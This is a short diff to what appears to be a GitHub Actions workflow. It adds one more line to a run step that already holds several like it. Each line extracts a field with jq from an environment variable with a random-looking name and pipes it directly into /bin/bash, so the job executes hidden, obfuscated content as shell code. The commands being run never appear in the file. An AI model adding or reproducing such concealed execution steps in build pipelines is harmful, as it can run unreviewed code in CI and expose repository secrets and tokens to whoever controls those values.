@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$xpgeu873" | jq -r .katuz8945 | /bin/bash
           echo $e56298 | jq -r .xkyep2 | /bin/bash
           printf '%s' "$hpwj1" | jq -r .kqcfw94 | /bin/bash
+          printf '%s' "$ndq7" | jq -r .y9 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
